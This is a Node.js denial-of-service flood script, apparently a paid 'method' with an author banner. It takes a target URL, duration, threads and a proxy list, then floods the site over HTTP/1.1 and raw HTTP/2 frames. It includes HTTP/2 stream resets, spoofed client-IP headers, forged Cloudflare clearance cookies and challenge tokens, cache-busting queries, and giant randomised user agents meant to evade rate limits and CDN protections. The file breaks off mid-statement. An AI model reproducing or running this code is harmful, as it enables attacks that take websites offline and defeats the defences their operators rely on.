const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const puppeteerAnonymize = require("puppeteer-extra-plugin-anonymize-ua");
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker');
const HttpsProxyAgent = require('https-proxy-agent');
const fs = require('fs');
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const https = require('https');
const os = require('os');
const axios = require('axios');
const crypto = require('crypto');
const { exec } = require('child_process');
const chalk = require('chalk');

const platforms = [
    'Windows NT 10.0; Win64; x64',
    'Macintosh; Intel Mac OS X 10_15_7',
    'X11; Linux x86_64',
    'iPhone; CPU iPhone OS 15_0 like Mac OS X',
];
const renderers = [
    'AppleWebKit/537.36 (KHTML, like Gecko)',
    'Gecko/20100101',
    'compatible; MSIE 10.0; Trident/6.0',
];
const browsers = [
    'Chrome/{}.0.0.0 Safari/537.36',
    'Firefox/{}.0',
    'Version/{}.0 Mobile Safari/537.36',
    'BotLike/{} (compatible; CustomAgent/1.0)',
];
const extensions = [
    'Edge/{}.0',
    'OPR/{}.0.0.0',
    'UCBrowser/{}.0.0.0',
];
const unicodeChars = [
    '\u00A0', '\u200B', '\u2013', '\u2014', '\u202F', '\u00B7', '\u00A9', '\u201C', '\u00AE', '\u00BB', '\u00B1', '\u00A7', '\uFFFD', '\u02DA',
];
function randomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    return result;
}
function fakeBase64(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
    let result = '';
    for (let i = 0; i < length; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    return result;
}
function fakeHex(length) {
    const chars = '0123456789abcdef';
    let result = '';
    for (let i = 0; i < length; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    return result;
}
function fakeToken() {
    return `${fakeBase64(20)}.${fakeBase64(30)}.${fakeBase64(15)}`;
}
function fakeUUID() {
    const template = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx';
    return template.replace(/[xy]/g, c => {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}
function addUnicodeNoise(str) {
    let result = '';
    for (let char of str) {
        result += char;
        if (Math.random() < 0.4) result += unicodeChars[Math.floor(Math.random() * unicodeChars.length)];
    }
    return result;
}
function permuteSyntax(item) {
    const parts = item.split('/');
    const formats = [
        item, item.replace('/', ':'), item.replace('/', '='), item.replace('/', '~'),
        `${parts[0]}_${parts[1]}_${randomString(5)}`, `${randomString(4)}|${item}`,
        `${randomString(3)}*${item}`, `${parts[1]}/${parts[0]}`,
        `${parts[0]}[${randomString(6)}]/${parts[1]}`, `${parts[0]}{${randomString(4)}}/${parts[1]}`,
        `${parts[0]}@${randomString(3)}/${parts[1]}`, `(${parts[0]}[${randomString(3)}])/${parts[1]}`,
    ];
    return formats[Math.floor(Math.random() * formats.length)];
}
function generateNestedComponent(depth = 1, maxDepth = 5, type = 'Module') {
    if (depth > maxDepth) return '';
    const name = `${type}${Math.floor(Math.random() * 100)}`;
    const version = `${Math.floor(Math.random() * 9 + 1)}.${Math.floor(Math.random() * 10)}`;
    let component = `${name}/${version}`;
    const encOptions = [
        `;Cipher=${fakeHex(32)}`, `;Token=${fakeBase64(16)}`, `;UUID=${fakeUUID()}`,
        `;EncType=AES-256-CBC;IV=${fakeHex(16)}`,
    ];
    if (Math.random() < 0.5) component += encOptions[Math.floor(Math.random() * encOptions.length)];
    component = permuteSyntax(component);
    component = addUnicodeNoise(component);
    if (Math.random() < 0.6 && depth < maxDepth) {
        const subType = ['Module', 'SubSystem', 'Feature', 'Service', 'Core'][Math.floor(Math.random() * 5)];
        const subCount = Math.floor(Math.random() * 3 + 1);
        const subComponents = [];
        for (let i = 0; i < subCount; i++) {
            const subComponent = generateNestedComponent(depth + 1, maxDepth, subType);
            if (subComponent) subComponents.push(subComponent);
        }
        if (subComponents.length > 0) component += ` (${subComponents.join(' ')})`;
    }
    return component;
}
function generateEncodedUA() {
    const platform = platforms[Math.floor(Math.random() * platforms.length)];
    const renderer = renderers[Math.floor(Math.random() * renderers.length)];
    const browser = browsers[Math.floor(Math.random() * browsers.length)].replace('{}', Math.floor(Math.random() * 37 + 90));
    const ext = extensions[Math.floor(Math.random() * extensions.length)].replace('{}', Math.floor(Math.random() * 37 + 90));
    let ua = `Mozilla/5.0 (${platform}) ${renderer} ${browser} ${ext}`;
    const appCount = Math.floor(Math.random() * 5 + 18);
    const apps = [];
    for (let i = 0; i < appCount; i++) {
        const appName = `App${Math.floor(Math.random() * 50)}`;
        const appVersion = `${Math.floor(Math.random() * 5 + 1)}.${Math.floor(Math.random() * 10)}`;
        let app = `${appName}/${appVersion}`;
        const encOptions = [`;Auth=${fakeToken()}`, `;Cipher=${fakeHex(32)}`, `;EncType=AES-256-GCM;KeyID=${fakeUUID()}`];
        if (Math.random() < 0.6) app += encOptions[Math.floor(Math.random() * encOptions.length)];
        app = permuteSyntax(app);
        app = addUnicodeNoise(app);
        const componentCount = Math.floor(Math.random() * 3 + 2);
        const components = [];
        for (let j = 0; j < componentCount; j++) {
            const componentType = ['Module', 'SubSystem', 'Feature', 'Service', 'Core'][Math.floor(Math.random() * 5)];
            const component = generateNestedComponent(1, 5, componentType);
            if (component) components.push(component);
        }
        if (components.length > 0) app += ` (${components.join(' ')})`;
        apps.push(app);
    }
    ua += ' ' + apps.join(' ');
    const timestamp = Date.now().toString();
    const hash1 = crypto.createHash('sha256').update(timestamp).digest('hex').slice(0, 16);
    const hash2 = crypto.createHash('md5').update(timestamp + randomString(10)).digest('hex').slice(0, 12);
    let encodedData = `Encoded/${hash1}/Session/${Math.floor(Math.random() * 9000 + 1000)};Cipher=${fakeHex(32)}`;
    let profileData = `Profile/${randomString(12)}/Token=${fakeToken()};EncType=AES-256-CBC;IV=${fakeHex(16)}`;
    encodedData = addUnicodeNoise(encodedData);
    profileData = addUnicodeNoise(profileData);
    ua += ` ${encodedData} ${profileData}`;
    const idCount = Math.floor(Math.random() * 11 + 95);
    const identifiers = [];
    for (let i = 0; i < idCount; i++) {
        let id = `ID${Math.floor(Math.random() * 100)}/${randomString(8)}`;
        const encOptions = [`;Sig=${fakeBase64(12)}`, `;Cipher=${fakeHex(24)}`, `;UUID=${fakeUUID()}`];
        if (Math.random() < 0.4) id += encOptions[Math.floor(Math.random() * encOptions.length)];
        id = permuteSyntax(id);
        id = addUnicodeNoise(id);
        identifiers.push(id);
    }
    ua += ' ' + identifiers.join(' ');
    const noiseOptions = [
        `like Gecko Trident/7.0 rv:${Math.floor(Math.random() * 2 + 10)].0`,
        `compatible; CustomBot/1.${Math.floor(Math.random() * 5)}`,
        `WebView/${Math.floor(Math.random() * 5 + 1)}.0`,
        `Netscape/4.${Math.floor(Math.random() * 9)} (Legacy)`,
    ];
    ua += ' ' + noiseOptions[Math.floor(Math.random() * noiseOptions.length)];
    while (ua.length < 1900) {
        let extra = `ExtraID${Math.floor(Math.random() * 100)}/${randomString(10)};Cipher=${fakeHex(16)}`;
        extra = permuteSyntax(extra);
        extra = addUnicodeNoise(extra);
        ua += ` ${extra}`;
    }
    if (ua.length > 2100) ua = ua.slice(0, 2000) + ' Safari/537.36';
    return ua;
}

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
.setMaxListeners(0)
.on('uncaughtException', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
})
.on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
})
.on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
})
.on("SIGHUP", () => {
    return 1;
})
.on("SIGCHILD", () => {
    return 1;
});

const statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4], 10);
setTimeout(() => { process.exit(1); }, time * 1000);
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const connectFlag = process.argv.includes('--connect');
const hello = process.argv.indexOf('--limit');
const limit = hello !== -1 && hello + 1 < process.argv.length ? process.argv[hello + 1] : undefined;
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const cacheIndex = process.argv.indexOf('--cache');
const enableCache = cacheIndex !== -1;
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`${chalk.blue('NEW v3 Method With Luv // Updated: 06.09.2025 | Update: @nmcutiii')}`);
    console.log(`${chalk.blue('Join https://nmcutiii.info | https://nmcutiii.one to update ')}`);
    console.log(chalk.red.underline('How to use & example:'));
    console.log(chalk.red.bold(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>`));
    console.log(`node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --debug --limit true --cache\n`);
    console.error(chalk.yellow(`
    Options:
      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?randomstring 3 - ?q=fwfwwffw
      --cache - bypass cache cloudflare
      --debug - show your status code
      --delay <1-50> - Set delay
      --connect - keep proxy connection
      --limit true/false - bypass ratelimit (test)
    `));
    process.exit(1);
}
if (!target.startsWith('https://')) {
    console.error('Error protocol can only https://');
    process.exit(1);
}
if (!fs.existsSync(proxyfile)) {
    console.error('Proxy file does not exist');
    process.exit(1);
}
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(line => {
    const [host, port] = line.split(':');
    return host && port && !isNaN(port);
});
if (proxy.length === 0) {
    console.error('No valid proxies');
    process.exit(1);
}
const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    return alphabet[randomIndex];
};
let randomPathSuffix = '';
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}`;
}, 3333);
let hcookie = '';
const url = new URL(target);
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame = Buffer.concat([frame, payload]);
    return frame;
}
function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;
    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) {
            return null;
        }
    }
    return { streamId, length, type, flags, payload };
}
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}
function encodeRstStream(streamId, errorCode = 0) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(3, 4);
    frameHeader.writeUInt8(0, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(errorCode, 0);
    return Buffer.concat([frameHeader, payload]);
}
function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}
function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}
function randomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
}
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
const legitIP = generateLegitIP();
function generateLegitIP() {
    const asnData = [
        { asn: "AS15169", country: "US", ip: "8.8.8." },
        { asn: "AS8075", country: "US", ip: "13.107.21." },
        { asn: "AS14061", country: "SG", ip: "104.18.32." },
        { asn: "AS13335", country: "NL", ip: "162.158.78." },
        { asn: "AS16509", country: "DE", ip: "3.120.0." },
        { asn: "AS14618", country: "JP", ip: "52.192.0." },
        { asn: "AS32934", country: "US", ip: "157.240.0." },
        { asn: "AS54113", country: "US", ip: "104.244.42." },
        { asn: "AS15133", country: "US", ip: "69.171.250." }
    ];
    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}
function generateAlternativeIPHeaders() {
    const headers = {};
    if (Math.random() < 0.5) headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = generateLegitIP();
    if (Math.random() < 0.5) headers["via"] = `1.1 ${generateLegitIP()}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = generateLegitIP();
    if (Math.random() < 0.3) headers["x-coming-from"] = generateLegitIP();
    if (Math.random() < 0.4) headers["akamai-client-ip"] = generateLegitIP();
    if (Object.keys(headers).length === 0) {
        headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    }
    return headers;
}
function getRandomMethod() {
    const methods = ['POST', 'HEAD'];
    return methods[Math.floor(Math.random() * methods.length)];
}
const cache_bypass = [
    {'cache-control': 'max-age=0, no-cache, no-store, must-revalidate'},
    {'pragma': 'no-cache'},
    {'expires': '0'},
    {'x-bypass-cache': 'true'},
    {'x-cache-bypass': '1'},
    {'x-no-cache': '1'},
    {'cache-tag': 'none'},
    {'clear-site-data': '"cache"'},
];
function randomIP() {
    return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}
const ratelimit_bypass = [
    {'x-forwarded-for': randomIP()},
    {'x-real-ip': randomIP()},
    {'x-client-ip': randomIP()},
    {'cf-connecting-ip': randomIP()},
    {'true-client-ip': randomIP()},
    {'x-originating-ip': randomIP()},
    {'client-ip': randomIP()},
    {'via': `1.1 ${randstr(6)}.cloudfront.net (CloudFront)`},
    {'cf-ipcountry': randomElement(['US', 'UK', 'FR', 'DE', 'IT', 'CA', 'AU', 'JP', 'IN', 'BR', 'NL'])},
    {'origin': `https://${randstr(8)}.com`},
    {'fastly-client-ip': randomIP()},
    {'cdn-loop': `cloudflare; host=${randstr(8)}.com`},
    {'x-requested-with': 'XMLHttpRequest'},
    {'x-api-version': `v${getRandomInt(1, 5)}`},
    {'x-fingerprint': crypto.randomBytes(16).toString('hex')},
    {'x-bypass-rate-limit': '1'},
    {'cf-worker': randstr(10)},
    {'cf-ray': `${randstr(16)}-${randomElement(['EWR', 'DFW', 'SEA', 'LAX', 'ORD', 'IAD'])}`}
];
function generateCacheQuery() {
    const techniques = [
        () => `?q=${generateRandomString(8, 12)}`,
        () => `?cache=${generateRandomString(6, 10)}`,
        () => `?rand=${generateRandomString(10, 15)}`,
        () => `?v=${generateRandomString(5, 8)}`
    ];
    const selected = techniques[Math.floor(Math.random() * techniques.length)];
    return selected();
}
function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    let tlsSocket;
    if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
        go();
        return;
    }
    const ciphersList = [
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256",
        "TLS_AES_128_GCM_SHA256",
        "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
        "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
        "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
        "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
        "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
        "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
        "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
        "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
        "TLS_RSA_WITH_AES_128_GCM_SHA256",
        "TLS_RSA_WITH_AES_256_GCM_SHA384",
        "TLS_RSA_WITH_AES_128_CBC_SHA",
        "TLS_RSA_WITH_AES_256_CBC_SHA"
    ];
    const ciphers = ciphersList.join(':');
    const sigalgs = [
        'ecdsa_secp256r1_sha256',
        'rsa_pss_rsae_sha256',
        'rsa_pkcs1_sha256',
        'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha384',
        'rsa_pkcs1_sha384',
        'rsa_pss_rsae_sha512',
        'rsa_pkcs1_sha512'
    ];
    const SignalsList = sigalgs.join(':');
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: ciphers,
                sigalgs: SignalsList,
                secureOptions: 
                    crypto.constants.SSL_OP_NO_SSLv2 |
                    crypto.constants.SSL_OP_NO_SSLv3 |
                    crypto.constants.SSL_OP_NO_TLSv1 |
                    crypto.constants.SSL_OP_NO_TLSv1_1 |
                    crypto.constants.ALPN_ENABLED |
                    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
                    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
                    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
                    crypto.constants.SSL_OP_PKcs1_CHECK_2 |
                    crypto.constants.SSL_OP_SINGLE_DH_USE |
                    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
                    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }

                    function main() {
                        const method = enableCache ? getRandomMethod() : reqmethod;
                        const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
                        const h1payl = `${method} ${path}${url.search || ''} HTTP/1.1\r\nHost: ${url.hostname}\r\nUser-Agent: CheckHost (https://check-host.net)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n${enableCache ? 'Cache-Control: no-cache, no-store, must-revalidate\r\n' : ''}Connection: keep-alive\r\n\r\n`;
                        tlsSocket.write(h1payl, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    main();
                                }, isFull ? 1000 : 1000 / ratelimit);
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        });
                    }

                    main();

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy());
                    });
                    return;
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy());
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);
                const frames1 = [];
                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        ...(Math.random() < 0.996 ? [[1, custom_table]] : [[1, custom_table]]),
                        [2, 0],
                        ...(Math.random() < 0.996 ? [[4, custom_window]] : [[4, custom_window]]),
                        ...(Math.random() < 0.996 ? [[6, custom_header]] : [[6, custom_header]]),
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];
                frames1.push(...frames);

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);

                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }

                            if (frame.type == 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];

                                if (status == 403) {
                                    tlsSocket.write(encodeRstStream(0));
                                    tlsSocket.end(() => tlsSocket.destroy());
                                    netSocket.end(() => netSocket.destroy());
                                }

                                if (!statuses[status])
                                    statuses[status] = 0;

                                statuses[status]++;
                            }
                            
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {
                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0;

                                        statuses["GOAWAY"]++;
                                    }
                                }

                                tlsSocket.write(encodeRstStream(0));
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        } else {
                            break;
                        }
                    }
                });

                tlsSocket.write(Buffer.concat(frames1));
                function main() {
                    if (tlsSocket.destroyed) {
                        return;
                    }
                    const requests = [];
                    const customHeadersArray = [];

                    function getRandomUserAgent() {
                        return generateEncodedUA();
                    }
                    let localRatelimit;
                    if (ratelimit !== undefined) {
                        localRatelimit = getRandomInt(1, 64);
                    } else {
                        localRatelimit = process.argv[6];
                    }
                    for (let i = 0; i < (isFull ? localRatelimit : 1); i++) {
                        let randomNum = Math.floor(Math.random() * (10000 - 100 + 1) + 10000);
                        const method = enableCache ? getRandomMethod() : reqmethod;
                        const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
                        const headers = Object.entries({
                            ":method": method,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": path,
                        }).concat(Object.entries({
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": Math.random() < 0.5 ? '"Windows"' : '"macOS"',
                            "upgrade-insecure-requests": "1",
                            "sec-fetch-site": "none",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-user": "?1",
                            "sec-fetch-dest": "document",
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": Math.random() < 0.5 ? 'en-US,en;q=0.9' : 'en-GB,en;q=0.8',
                            "user-agent": getRandomUserAgent(),
                            ...(enableCache ? Object.assign({}, ...cache_bypass) : {}),
                            ...(limit ? Object.assign({}, ...ratelimit_bypass) : {})
                        }).filter(a => a[1] != null));

                        const headers2 = Object.entries({
                            ...(Math.random() < 0.5 && { "referer": `https://${randomNum}.google.com` }),
                            ...(Math.random() < 0.5 && { "dnt": "1" }),
                            ...(Math.random() < 0.5 && { "cookie": `cf_clearance=${randstr(10)}_${randstr(15)}-17494${randomNum}1-${randomNum}.${randomNum}.${randomNum}.${randomNum}-${randstr(30)}_${randstr(35)}` }),
                        }).filter(a => a[1] != null);

                        const headers3 = Object.entries({}).filter(a => a[1] != null);

                        for (let i = headers2.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                        }

                        const combinedHeaders = headers.concat(headers2).concat(headers3);
                        
                        function handleQuery(query) {
                            if (query === '1') {
                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                            } else if (query === '2') {
                                return url.pathname + `${randomPathSuffix}`;
                            } else if (query === '3') {
                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else {
                                return url.pathname;
                            }
                        }

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);
                        const flags = 0x1 | 0x4 | 0x8 | 0x20;
                        const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                        const frame = Buffer.concat([encodedFrame]);
                        if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
                            const rstStreamFrame = encodeRstStream(streamId, 8);
                            tlsSocket.write(Buffer.concat([rstStreamFrame, frame]));
                            STREAMID_RESET = 0